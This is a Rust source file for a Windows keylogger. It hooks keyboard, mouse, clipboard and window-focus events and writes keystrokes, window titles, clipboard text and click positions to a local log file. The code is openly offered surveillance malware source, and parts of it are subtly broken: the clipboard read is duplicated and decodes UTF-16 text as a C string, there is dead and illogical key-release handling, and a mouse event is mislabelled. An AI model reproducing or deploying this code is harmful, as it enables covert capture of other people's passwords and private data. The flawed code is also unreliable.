use lazy_static::lazy_static;
use rdev::{listen, Event, EventType, Key};
use std::cell::Cell;
use std::collections::HashMap;
use std::collections::HashSet;
use std::ffi::OsStr;
use std::fs::OpenOptions;
use std::io::{BufWriter, Write};
use std::os::windows::ffi::OsStrExt;
use std::sync::atomic::AtomicBool;
use std::sync::{Arc, Mutex, Once};
use std::thread;
use widestring::U16CString;
use winapi::ctypes::c_int;
use winapi::shared::minwindef::{LPARAM, LRESULT, UINT, WPARAM};
use winapi::shared::windef::HWINEVENTHOOK__;
use winapi::shared::windef::{HHOOK, HWND, POINT};
use winapi::um::libloaderapi::GetModuleHandleW;
use winapi::um::winbase::{GlobalLock, GlobalUnlock};
use winapi::um::winuser::MapVirtualKeyA;
use winapi::um::winuser::{
    AddClipboardFormatListener, CallNextHookEx, CallWindowProcW, CloseClipboard, CreateWindowExW,
    DestroyWindow, DispatchMessageW, GetAsyncKeyState, GetClipboardData, GetForegroundWindow,
    GetMessageW, GetWindowTextLengthW, GetWindowTextW, IsClipboardFormatAvailable, MessageBoxW,
    OpenClipboard, PostQuitMessage, RemoveClipboardFormatListener, SetWinEventHook,
    SetWindowLongPtrW, SetWindowsHookExW, TranslateMessage, UnhookWinEvent, UnhookWindowsHookEx,
    KBDLLHOOKSTRUCT, MSLLHOOKSTRUCT, WH_KEYBOARD_LL, WH_MOUSE_LL, WM_KEYDOWN, WM_LBUTTONDOWN,
    WM_LBUTTONUP, WM_RBUTTONDOWN, WM_RBUTTONUP,
};

#[derive(Debug)]
struct SafeHook(HHOOK);

// SAFETY: We ensure hook is only accessed from creating thread
unsafe impl Send for SafeHook {}
unsafe impl Sync for SafeHook {}

//This is a HashMap that maps virtual key codes (as integers) to their corresponding string representations.

lazy_static! {
    static ref KEY_NAME: HashMap<i32, &'static str> = {
        let mut map = HashMap::new();

        // Basic Keys
        map.insert(0x08, "[BACKSPACE]");
        map.insert(0x09, "[TAB]");
        map.insert(0x0D, "\n");
        map.insert(0x20, " ");
        map.insert(0x1B, "[ESCAPE]");

        // Function Keys
        for i in 0x70..=0x7B {
            let key_name = format!("[F{}]", i - 0x6F);
            map.insert(i, Box::leak(key_name.into_boxed_str()));
        }

        // Navigation Keys
        map.insert(0x21, "[PG_UP]");
        map.insert(0x22, "[PG_DOWN]");
        map.insert(0x23, "[END]");
        map.insert(0x24, "[HOME]");
        map.insert(0x25, "[LEFT]");
        map.insert(0x26, "[UP]");
        map.insert(0x27, "[RIGHT]");
        map.insert(0x28, "[DOWN]");

        // Modifier Keys
        map.insert(0x10, "[SHIFT]");
        map.insert(0xA0, "[LSHIFT]");
        map.insert(0xA1, "[RSHIFT]");
        map.insert(0x11, "[CONTROL]");
        map.insert(0xA2, "[LCONTROL]");
        map.insert(0xA3, "[RCONTROL]");
        map.insert(0x12, "[ALT]");
        map.insert(0x5B, "[LWIN]");
        map.insert(0x5C, "[RWIN]");

        // Special Keys
        map.insert(0x14, "[CAPSLOCK]");
        map.insert(0x90, "[NUMLOCK]");
        map.insert(0x91, "[SCROLLLOCK]");

        // Letters A-Z
        for i in 0x41..=0x5A { // A-Z
            map.insert(i, &char::from_u32(i as u32).unwrap().to_string());
        }

        map
    };

    static ref MOUSE_HOOK: Mutex<Option<HHOOK>> = Mutex::new(None);
    static ref CLIPBOARD_WINDOW: Mutex<Option<HWND>> = Mutex::new(None);
    static ref WIN_EVENT_HOOK: Mutex<Option<HWINEVENTHOOK>> = Mutex::new(None);

    static ref OUTPUT_FILE: Mutex<BufWriter<std::fs::File>> = {
        let file = OpenOptions::new()
            .append(true)
            .create(true)
            .open("keylogger.log")
            .expect("Failed to open log file");
        Mutex::new(BufWriter::new(file))
    };
}

static INIT: Once = Once::new();

unsafe extern "system" fn hook_callback(n_code: c_int, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    if n_code >= 0 && w_param == WM_KEYDOWN as usize {
        let kbd_struct: *const KBDLLHOOKSTRUCT = l_param as *const KBDLLHOOKSTRUCT;
        let vk_code = (*kbd_struct).vkCode;

        // Save the key stroke
        save(vk_code as i32);

        // Check for a termination key (e.g., Ctrl + C)
        if vk_code == winapi::um::winuser::VK_C && GetAsyncKeyState(winapi::um::winuser::VK_CONTROL) < 0 {
            println!("Termination key pressed. Exiting...");
            PostQuitMessage(0); // Post a quit message with exit code 0
        }
    }

    CallNextHookEx(std::ptr::null_mut(), n_code, w_param, l_param)
}

const VAL: usize = WM_LBUTTONDOWN as usize;
const VAL_RBUTTONDOWN: usize = WM_RBUTTONDOWN as usize;
const VAL_RBUTTONUP: usize = WM_RBUTTONUP as usize;

const DEFAULT_WINDOW_PROC: *mut winapi::um::winuser::WNDPROC = std::ptr::null_mut();

unsafe extern "system" fn mouse_callback(
    n_code: c_int,
    w_param: WPARAM,
    l_param: LPARAM,
) -> LRESULT {
    if n_code >= 0 {
        let mouse_struct: *const MSLLHOOKSTRUCT = l_param as *const MSLLHOOKSTRUCT;
        match w_param {
            val if val == WM_LBUTTONDOWN as usize => {
                save_mouse_event("Left Mouse Button Down", (*mouse_struct).pt)
            }
            val if val == WM_LBUTTONUP as usize => {
                save_mouse_event("Left Mouse Button Up", (*mouse_struct).pt)
            }
            val if val == WM_RBUTTONDOWN as usize => {
                save_mouse_event("Right Mouse Button Down", (*mouse_struct).pt)
            }
            val if val == WM_RBUTTONUP as usize => {
                save_mouse_event("Right Mouse Button Up", (*mouse_struct).pt)
            }
            VAL => save_mouse_event("Right Mouse Button Up", (*mouse_struct).pt),
            _ => {}
        }
    }
    CallNextHookEx(std::ptr::null_mut(), n_code, w_param, l_param)
}

fn save_mouse_event(event_type: &str, position: POINT) {
    let output = format!(
        "[Mouse Event] {} at ({}, {})\n",
        event_type, position.x, position.y
    );
    if let Ok(mut file) = OUTPUT_FILE.lock() {
        writeln!(file, "{}", output).expect("Failed to write to file");
        file.flush().expect("Failed to flush file");
    }
}

unsafe extern "system" fn clipboard_window_proc(
    hwnd: HWND,
    msg: UINT,
    w_param: WPARAM,
    l_param: LPARAM,
) -> LRESULT {
    if msg == winapi::um::winuser::WM_CLIPBOARDUPDATE {
        save_clipboard_content();
    }
    CallWindowProcW(DEFAULT_WINDOW_PROC, hwnd, msg, w_param, l_param)
}

fn save_clipboard_content() {
    unsafe {
        if IsClipboardFormatAvailable(winapi::um::winuser::CF_UNICODETEXT) != 0 {
            if OpenClipboard(std::ptr::null_mut()) != 0 {
                let data = GetClipboardData(winapi::um::winuser::CF_UNICODETEXT);
                let text_ptr = GlobalLock(data) as *const u16;
                let text = U16CString::from_ptr_str(text_ptr).to_string_lossy();
                if !data.is_null() {
                    let text = GlobalLock(data) as *const u16;
                    if !text.is_null() {
                        let c_str = std::ffi::CStr::from_ptr(text);
                        let content = c_str.to_string_lossy().into_owned();
                        GlobalUnlock(data);

                        let output = format!("[Clipboard Update] {}\n", content);
                        if let Ok(mut file) = OUTPUT_FILE.lock() {
                            writeln!(file, "{}", output).expect("Failed to write to file");
                            file.flush().expect("Failed to flush file");
                        }
                    }
                }
                CloseClipboard();
            }
        }
    }
}

unsafe extern "system" fn win_event_callback(
    _h_winevent_hook: *mut HWINEVENTHOOK__,
    event: u32,
    hwnd: HWND,
    _id_object: i32,
    _id_child: i32,
    _dw_event_thread: u32,
    _dwms_event_time: u32,
) {
    if event == winapi::um::winuser::EVENT_SYSTEM_FOREGROUND {
        let mut window_title: [u16; 256] = [0; 256];
        let len = GetWindowTextLengthW(hwnd) + 1;
        let mut buffer = Vec::with_capacity(len as usize);
        GetWindowTextW(hwnd, buffer.as_mut_ptr(), len);
        GetWindowTextW(hwnd, window_title.as_mut_ptr(), 256);
        let title = String::from_utf16_lossy(&window_title);

        let output = format!("[Window Switch] {}\n", title.trim_end_matches('\0'));
        if let Ok(mut file) = OUTPUT_FILE.lock() {
            writeln!(file, "{}", output).expect("Failed to write to file");
            file.flush().expect("Failed to flush file");
        }
    }
}

fn save(key_stroke: i32) {
    let mut output = String::new();

    unsafe {
        let foreground = GetForegroundWindow();
        let mut window_title: [u16; 256] = [0; 256];
        GetWindowTextW(foreground, window_title.as_mut_ptr(), 256);
        let window_title = String::from_utf16_lossy(&window_title);

        if !window_title.is_empty() {
            output.push_str(&format!("\n\n[Window: {}]", window_title));
        }
    }

    let key_str = match KEY_NAME.get(&key_stroke) {
        Some(name) => name.to_string(),
        None => unsafe {
            let caps_lock_on = GetAsyncKeyState(winapi::um::winuser::VK_CAPITAL) & 0x0001 != 0;
            let shift_pressed = GetAsyncKeyState(winapi::um::winuser::VK_SHIFT) < 0;
            let uppercase = (shift_pressed && !caps_lock_on) || (!shift_pressed && caps_lock_on);

            let char_code =
                MapVirtualKeyA(key_stroke as u32, winapi::um::winuser::MAPVK_VK_TO_CHAR) as u8;
            let char = char::from(char_code);

            if char.is_ascii_alphabetic() {
                if uppercase {
                    char.to_ascii_uppercase().to_string()
                } else {
                    char.to_ascii_lowercase().to_string()
                }
            } else {
                format!("[{:X}]", key_stroke)
            }
        },
    };

    output.push_str(&key_str);

    if let Ok(mut file) = OUTPUT_FILE.lock() {
        writeln!(file, "{}", output).expect("Failed to write to file");
        file.flush().expect("Failed to flush file");
    }
}

unsafe extern "system" fn set_hooks() {
    INIT.call_once(|| {
        let module_handle = GetModuleHandleW(std::ptr::null_mut());

        if module_handle.is_null() {
            panic!("Failed to get module handle!");
        }

        // Keyboard Hook
        let keyboard_hook =
            SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_callback), module_handle, 0);
        if keyboard_hook.is_null() {
            panic!("Failed to install keyboard hook!");
        }

        // Mouse Hook
        let mouse_hook = SetWindowsHookExW(WH_MOUSE_LL, Some(mouse_callback), module_handle, 0);
        *MOUSE_HOOK.lock().unwrap() = Some(mouse_hook);
        if mouse_hook.is_null() {
            panic!("Failed to install mouse hook!");
        }

        // Clipboard Listener
        let hwnd = CreateWindowExW(
            0,
            OsStr::new("STATIC")
                .encode_wide()
                .chain(Some(0))
                .collect::<Vec<u16>>()
                .as_ptr(),
            std::ptr::null_mut(),
            winapi::um::winuser::WS_OVERLAPPEDWINDOW,
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            GetModuleHandleW(std::ptr::null_mut()),
            std::ptr::null_mut(),
        );
        *CLIPBOARD_WINDOW.lock().unwrap() = Some(hwnd);
        SetWindowLongPtrW(
            hwnd,
            winapi::um::winuser::GWLP_WNDPROC,
            clipboard_window_proc as *const () as isize,
        );
        AddClipboardFormatListener(hwnd);

        // Window Switch Hook
        let win_event_hook = SetWinEventHook(
            winapi::um::winuser::EVENT_SYSTEM_FOREGROUND,
            winapi::um::winuser::EVENT_SYSTEM_FOREGROUND,
            std::ptr::null_mut(),
            Some(win_event_callback),
            0,
            0,
            winapi::um::winuser::WINEVENT_OUTOFCONTEXT,
        );
        *WIN_EVENT_HOOK.lock().unwrap() = Some(win_event_hook);
        if win_event_hook.is_null() {
            panic!("Failed to install window switch hook!");
        }
    });
}

fn save_event(
    event: Event,
    output: Arc<Mutex<String>>,
    shift_pressed: Arc<Mutex<bool>>,
    caps_lock: Arc<Mutex<bool>>,
) {
    if let EventType::KeyPress(key) = event.event_type {
        let mut output_lock = output.lock().unwrap();
        let mut shift_lock = shift_pressed.lock().unwrap();
        let mut caps_lock_state = caps_lock.lock().unwrap();

        // Handle Shift Key Press
        if key == Key::ShiftLeft || key == Key::ShiftRight {
            *shift_lock = true;
            return;
        }

        // Handle Shift Key Release
        if let EventType::KeyRelease(key) = event.event_type {
            if key == Key::ShiftLeft || key == Key::ShiftRight {
                *shift_lock = false;
                return;
            }
        }

        // Handle Caps Lock Toggle
        if key == Key::CapsLock {
            *caps_lock_state = !*caps_lock_state;
            return;
        }

        let key_str = match key {
            Key::Space => " ".to_string(),
            Key::Enter => "[Enter]\n".to_string(),
            Key::Tab => "[Tab]".to_string(),
            Key::Backspace => "[Backspace]".to_string(),
            Key::Escape => "[Esc]".to_string(),
            Key::CapsLock => "[CapsLock]".to_string(),
            Key::ShiftLeft
            | Key::ShiftRight
            | Key::ControlLeft
            | Key::ControlRight
            | Key::Alt
            | Key::AltGr
            | Key::MetaLeft
            | Key::MetaRight => return, // Ignore Modifier Keys
            _ => format!("{:?}", key).replace("Key::", ""),
        };

        // Convert letters to uppercase if Shift or Caps Lock is active
        let mut formatted_key = key_str.clone();
        if let Some(c) = key_str.chars().next() {
            if c.is_alphabetic() {
                if *shift_lock || *caps_lock_state {
                    formatted_key = c.to_ascii_uppercase().to_string();
                } else {
                    formatted_key = c.to_ascii_lowercase().to_string();
                }
            }
        }

        // Append key to output buffer
        output_lock.push_str(&formatted_key);

        // Write to file
        if let Ok(mut file) = OpenOptions::new()
            .append(true)
            .create(true)
            .open("keylog.txt")
        {
            let _ = writeln!(file, "{}", formatted_key);
        }
    }
}

fn main() {
    set_hooks();
    notify_startup();

    let mut msg = unsafe { std::mem::zeroed() };
    while unsafe { GetMessageW(&mut msg, std::ptr::null_mut(), 0, 0) } != 0 {
        unsafe {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }

    release_hooks();

    // Create threads
    let key_name_thread = thread::spawn(|| {
        if let Some(key_name) = KEY_NAME.get(&0x08) {
            println!("Key name for 0x08: {}", key_name);
        }
    });

    let mouse_hook_thread = thread::spawn(|| {
        let mouse_hook_guard = MOUSE_HOOK.lock().unwrap();
        if let Some(hook) = *mouse_hook_guard {
            println!("Mouse hook is installed: {:?}", hook);
        } else {
            println!("Mouse hook is not installed.");
        }
    });

    let output_file_thread = thread::spawn(|| {
        let mut output_file_guard = OUTPUT_FILE.lock().unwrap();
        if let Err(e) = writeln!(output_file_guard, "Thread-safe log entry") {
            eprintln!("Failed to write to log file: {}", e);
        }
    });

    // Join threads
    key_name_thread.join().unwrap();
    mouse_hook_thread.join().unwrap();
    output_file_thread.join().unwrap();


}

fn notify_startup() {
    unsafe {
        let message = "Keylogger has started."
            .encode_utf16()
            .chain(Some(0))
            .collect::<Vec<u16>>();
        let title = "Program Started"
            .encode_utf16()
            .chain(Some(0))
            .collect::<Vec<u16>>();

        MessageBoxW(
            std::ptr::null_mut(),
            message.as_ptr(),
            title.as_ptr(),
            winapi::um::winuser::MB_OK | winapi::um::winuser::MB_ICONINFORMATION,
        );
    }
}

fn release_hooks() {
    if let Some(hwnd) = CLIPBOARD_WINDOW.lock().unwrap().take() {
        unsafe {
            // Remove the clipboard format listener
            RemoveClipboardFormatListener(hwnd);

            // Destroy the clipboard listener window
            DestroyWindow(hwnd);
        }
    }

    if let Some(hook) = MOUSE_HOOK.lock().unwrap().take() {
        unsafe { UnhookWindowsHookEx(*hook) };
    }

    if let Some(hook) = WIN_EVENT_HOOK.lock().unwrap().take() {
        unsafe { UnhookWinEvent(hook) };
    }
}
